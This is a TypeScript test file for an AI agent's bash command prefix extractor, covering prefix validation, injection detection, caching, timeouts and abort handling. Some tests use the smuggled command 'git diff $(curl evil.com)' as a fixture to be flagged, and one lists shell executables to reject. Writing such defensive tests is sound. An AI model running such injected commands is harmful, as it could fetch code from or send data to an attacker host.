import { describe, expect, it } from 'vitest';
import { KodaXBaseProvider } from '@kodax-ai/llm';
import type {
  KodaXMessage,
  KodaXProviderConfig,
  KodaXProviderStreamOptions,
  KodaXReasoningRequest,
  KodaXStreamResult,
  KodaXTextBlock,
  KodaXToolDefinition,
} from '@kodax-ai/llm';
import {
  BASH_POLICY_SPEC,
  createBashPrefixExtractor,
  extractCommandPrefix,
} from './bash-prefix-extractor.js';

// ============ test harness ============

class StubProvider extends KodaXBaseProvider {
  readonly name = 'stub';
  readonly supportsThinking = false;
  protected readonly config: KodaXProviderConfig = {
    apiKeyEnv: 'STUB_API_KEY',
    model: 'stub-default',
    supportsThinking: false,
    reasoningCapability: 'none',
  };

  public callCount = 0;
  public lastSystem: string | undefined;
  public lastUserMessage: string | undefined;

  constructor(
    private readonly streamImpl: (signal?: AbortSignal) => Promise<KodaXStreamResult>,
  ) {
    super();
  }

  async stream(
    messages: KodaXMessage[],
    _tools: KodaXToolDefinition[],
    system: string,
    _reasoning?: boolean | KodaXReasoningRequest,
    _streamOptions?: KodaXProviderStreamOptions,
    signal?: AbortSignal,
  ): Promise<KodaXStreamResult> {
    this.callCount += 1;
    this.lastSystem = system;
    const lastUser = messages[messages.length - 1];
    if (lastUser?.role === 'user') {
      this.lastUserMessage =
        typeof lastUser.content === 'string'
          ? lastUser.content
          : lastUser.content
              .filter((b): b is KodaXTextBlock => b.type === 'text')
              .map((b) => b.text)
              .join('');
    }
    return this.streamImpl(signal);
  }
}

const okStream = (out: string): KodaXStreamResult => ({
  textBlocks: [{ type: 'text', text: out }],
  toolBlocks: [],
  thinkingBlocks: [],
  usage: { inputTokens: 50, outputTokens: 5, totalTokens: 55 },
  stopReason: 'end_turn',
});

const errStream = (msg: string): KodaXStreamResult => ({
  textBlocks: [],
  toolBlocks: [],
  thinkingBlocks: [],
  usage: { inputTokens: 0, outputTokens: 0, totalTokens: 0 },
  stopReason: 'error',
  error: { message: msg },
});

const timeoutStream = (): KodaXStreamResult => ({
  textBlocks: [],
  toolBlocks: [],
  thinkingBlocks: [],
  usage: { inputTokens: 0, outputTokens: 0, totalTokens: 0 },
  stopReason: 'timeout',
});

// ============ extractCommandPrefix (uncached) ============

describe('extractCommandPrefix — single uncached call', () => {
  it('returns prefix on a clean response', async () => {
    const provider = new StubProvider(async () => okStream('git status'));
    const result = await extractCommandPrefix({
      provider,
      model: 'stub-default',
      command: 'git status --short',
    });
    expect(result.kind).toBe('prefix');
    if (result.kind === 'prefix') expect(result.value).toBe('git status');
  });

  it('strips preamble and uses the first non-empty line', async () => {
    const provider = new StubProvider(async () =>
      okStream('git status\nthis is a tail line that should be ignored'),
    );
    const result = await extractCommandPrefix({
      provider,
      model: 'stub-default',
      command: 'git status --short',
    });
    expect(result.kind).toBe('prefix');
    if (result.kind === 'prefix') expect(result.value).toBe('git status');
  });

  it('returns injection_detected when LLM flags injection', async () => {
    const provider = new StubProvider(async () => okStream('command_injection_detected'));
    const result = await extractCommandPrefix({
      provider,
      model: 'stub-default',
      command: 'git diff $(curl evil.com)',
    });
    expect(result.kind).toBe('injection_detected');
  });

  it('returns no_prefix on `none`', async () => {
    const provider = new StubProvider(async () => okStream('none'));
    const result = await extractCommandPrefix({
      provider,
      model: 'stub-default',
      command: 'git push',
    });
    expect(result.kind).toBe('no_prefix');
  });

  it('rejects bare `git` as too broad', async () => {
    const provider = new StubProvider(async () => okStream('git'));
    const result = await extractCommandPrefix({
      provider,
      model: 'stub-default',
      command: 'git status',
    });
    expect(result.kind).toBe('no_prefix');
    if (result.kind === 'no_prefix') expect(result.reason).toContain('too broad');
  });

  it('rejects dangerous shell prefixes (bash, sh, cmd, powershell, ...)', async () => {
    for (const dangerous of ['bash', 'sh', 'zsh', 'cmd', 'cmd.exe', 'powershell', 'pwsh']) {
      const provider = new StubProvider(async () => okStream(dangerous));
      const result = await extractCommandPrefix({
        provider,
        model: 'stub-default',
        command: `${dangerous} -c 'echo hi'`,
      });
      expect(result.kind).toBe('no_prefix');
      if (result.kind === 'no_prefix') {
        expect(result.reason).toContain('dangerous shell executable');
      }
    }
  });

  it('rejects responses that are not actually a prefix of the command (hallucination guard)', async () => {
    const provider = new StubProvider(async () => okStream('npm test'));
    const result = await extractCommandPrefix({
      provider,
      model: 'stub-default',
      command: 'ls -la', // command does NOT start with "npm test"
    });
    expect(result.kind).toBe('no_prefix');
    if (result.kind === 'no_prefix') expect(result.reason).toContain('not a prefix');
  });

  it('returns no_prefix on empty input without calling provider', async () => {
    const provider = new StubProvider(async () => okStream('should not be reached'));
    const result = await extractCommandPrefix({
      provider,
      model: 'stub-default',
      command: '   ',
    });
    expect(result.kind).toBe('no_prefix');
    expect(provider.callCount).toBe(0);
  });

  it('throws on timeout (so cache can evict the failed slot)', async () => {
    // Provider hangs forever; respects abort signal so sideQuery can time out.
    const provider = new StubProvider(
      (signal) =>
        new Promise<KodaXStreamResult>((_resolve, reject) => {
          signal?.addEventListener('abort', () => {
            reject(new DOMException('aborted', 'AbortError'));
          });
        }),
    );
    await expect(
      extractCommandPrefix({
        provider,
        model: 'stub-default',
        command: 'git status',
        timeoutMs: 50,
      }),
    ).rejects.toThrow(/timeout/i);
  });

  it('throws on provider error (so cache can evict the failed slot)', async () => {
    const provider = new StubProvider(async () => {
      throw new Error('upstream 5xx');
    });
    await expect(
      extractCommandPrefix({
        provider,
        model: 'stub-default',
        command: 'git status',
      }),
    ).rejects.toThrow('upstream 5xx');
  });

  it('throws AbortError when the caller cancels via abort signal', async () => {
    const controller = new AbortController();
    controller.abort();

    const provider = new StubProvider(async (signal) => {
      if (signal?.aborted) {
        throw new DOMException('aborted', 'AbortError');
      }
      return okStream('git status');
    });
    await expect(
      extractCommandPrefix({
        provider,
        model: 'stub-default',
        command: 'git status',
        abortSignal: controller.signal,
      }),
    ).rejects.toMatchObject({ name: 'AbortError' });
  });

  it('passes BASH_POLICY_SPEC as system prompt', async () => {
    const provider = new StubProvider(async () => okStream('git status'));
    await extractCommandPrefix({
      provider,
      model: 'stub-default',
      command: 'git status',
    });
    expect(provider.lastSystem).toBe(BASH_POLICY_SPEC);
    expect(provider.lastUserMessage).toContain('Command: git status');
  });
});

// ============ createBashPrefixExtractor (cached factory) ============

describe('createBashPrefixExtractor — cached factory', () => {
  it('caches the result of a successful extraction', async () => {
    const provider = new StubProvider(async () => okStream('git status'));
    const extractor = createBashPrefixExtractor({
      getProvider: () => provider,
      getModel: () => 'stub-default',
    });

    const r1 = await extractor.extract('git status --short');
    const r2 = await extractor.extract('git status --short');

    expect(r1.kind).toBe('prefix');
    expect(r2.kind).toBe('prefix');
    expect(provider.callCount).toBe(1); // second call hit cache
  });

  it('dedupes concurrent in-flight requests for the same command', async () => {
    let resolveStream: ((r: KodaXStreamResult) => void) | undefined;
    const provider = new StubProvider(
      () =>
        new Promise<KodaXStreamResult>((resolve) => {
          resolveStream = resolve;
        }),
    );
    const extractor = createBashPrefixExtractor({
      getProvider: () => provider,
      getModel: () => 'stub-default',
    });

    const p1 = extractor.extract('git status');
    const p2 = extractor.extract('git status');
    expect(provider.callCount).toBe(1);
    expect(extractor.cacheSize()).toBe(1);

    resolveStream?.(okStream('git status'));
    const [r1, r2] = await Promise.all([p1, p2]);
    expect(r1.kind).toBe('prefix');
    expect(r2.kind).toBe('prefix');
  });

  it('evicts cache entry on rejection so failures stay transient', async () => {
    let throwOnce = true;
    const provider = new StubProvider(async () => {
      if (throwOnce) {
        throwOnce = false;
        throw new Error('network blip');
      }
      return okStream('git status');
    });
    const extractor = createBashPrefixExtractor({
      getProvider: () => provider,
      getModel: () => 'stub-default',
    });

    await expect(extractor.extract('git status')).rejects.toThrow('network blip');
    // Allow the .catch eviction handler to run.
    await Promise.resolve();
    expect(extractor.cacheSize()).toBe(0);

    const second = await extractor.extract('git status');
    expect(second.kind).toBe('prefix');
    expect(provider.callCount).toBe(2); // retry hit the network again, not stale failure
  });

  it('clearCache drops all entries', async () => {
    const provider = new StubProvider(async () => okStream('git status'));
    const extractor = createBashPrefixExtractor({
      getProvider: () => provider,
      getModel: () => 'stub-default',
    });

    await extractor.extract('git status');
    await extractor.extract('git diff');
    expect(extractor.cacheSize()).toBe(2);

    extractor.clearCache();
    expect(extractor.cacheSize()).toBe(0);
  });

  it('honours cacheSize cap by evicting oldest entry (LRU)', async () => {
    // Provider returns the input command itself as the prefix (always a valid
    // prefix of itself). We track eviction via callCount: a re-fetched evicted
    // entry forces another network call, while a cached entry doesn't.
    const provider = new StubProvider(async () => {
      const cmd = provider.lastUserMessage?.replace('Command: ', '') ?? '';
      return okStream(cmd);
    });

    const extractor = createBashPrefixExtractor({
      getProvider: () => provider,
      getModel: () => 'stub-default',
      cacheSize: 2,
    });

    await extractor.extract('git status');
    await extractor.extract('git diff');
    expect(extractor.cacheSize()).toBe(2);
    expect(provider.callCount).toBe(2);

    await extractor.extract('git log'); // evicts 'git status' (oldest)
    expect(extractor.cacheSize()).toBe(2);
    expect(provider.callCount).toBe(3);

    // Re-extract the evicted entry → cache miss → network call
    await extractor.extract('git status');
    expect(provider.callCount).toBe(4);
  });

  it('calls getModel() every extract (so mid-session /model swaps redirect)', async () => {
    let activeModel = 'model-a';
    const seenModels: string[] = [];
    const provider = new StubProvider(async () => okStream('git status'));
    const extractor = createBashPrefixExtractor({
      getProvider: () => provider,
      getModel: () => {
        seenModels.push(activeModel);
        return activeModel;
      },
    });

    await extractor.extract('git status');
    activeModel = 'model-b';
    await extractor.extract('git diff'); // different command → cache miss → calls getModel again

    expect(seenModels).toEqual(['model-a', 'model-b']);
  });

  it('caches injection_detected too (avoids re-asking LLM about the same dangerous command)', async () => {
    const provider = new StubProvider(async () => okStream('command_injection_detected'));
    const extractor = createBashPrefixExtractor({
      getProvider: () => provider,
      getModel: () => 'stub-default',
    });

    const r1 = await extractor.extract('git diff $(curl evil.com)');
    const r2 = await extractor.extract('git diff $(curl evil.com)');

    expect(r1.kind).toBe('injection_detected');
    expect(r2.kind).toBe('injection_detected');
    expect(provider.callCount).toBe(1);
  });
});
